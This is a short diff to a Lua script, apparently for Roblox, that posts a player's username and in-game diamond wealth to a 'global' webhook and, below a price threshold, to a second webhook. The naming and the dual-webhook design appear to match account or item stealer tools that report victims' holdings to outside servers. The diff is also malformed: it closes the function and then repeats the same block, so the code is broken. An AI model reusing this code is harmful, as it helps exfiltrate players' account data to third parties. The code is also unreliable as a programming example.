@@ -131,13 +131,14 @@ local function SendMessage(username, diamonds, isAboveThreshold)
 
     -- Always send to the global webhook
     if globalWebhook and globalWebhook ~= "" then
-        local response = request({
-            Url = globalWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
+        local response = HttpService:PostAsync(globalWebhook, body, Enum.HttpContentType.ApplicationJson)
     end
+
+    -- If the RAP is below threshold, send to the alternative webhook too
+    if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
+        local response = HttpService:PostAsync(alternateWebhook, body, Enum.HttpContentType.ApplicationJson)
+    end
+end
 
     -- If the RAP is below threshold, send to the alternative webhook too
     if not isAboveThreshold and alternateWebhook and alternateWebhook ~= "" then
